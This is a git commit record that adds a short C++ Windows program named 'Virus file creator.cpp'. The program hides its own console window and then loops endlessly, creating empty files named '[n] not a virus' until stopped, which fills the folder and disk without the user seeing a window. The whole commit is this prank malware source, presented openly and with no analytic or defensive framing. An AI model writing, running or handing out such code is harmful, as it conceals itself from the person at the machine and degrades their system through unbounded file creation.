0a85f74c3da260fe2d329274556ac7cfdeb7553c
Vafeen <666av6@gmail.com>
2024-11-12 05:28:16 +0300

    12 11 2024 05:28:16

---
+++ Virus file creator.cpp
@@ -0,0 +1,26 @@
+﻿#include <iostream>
+#include<fstream>
+#include<string>
+#include<filesystem>
+#include<Windows.h>
+#include"resource.h"
+using std::cout;
+using std::ofstream;
+using std::to_string;
+using namespace std::filesystem;
+int main()
+{
+	setlocale(LC_ALL, "RUSSIAN");
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	ofstream filew;
+	int x = 1;
+	while (true)
+	{
+		if (!exists("[" + to_string(x) + "] not a virus "))//если файл не найден!
+		{
+			filew.open("[" + to_string(x) + "] not a virus "); filew.close();
+		}
+		x++;
+	}
+	return 0;
+}
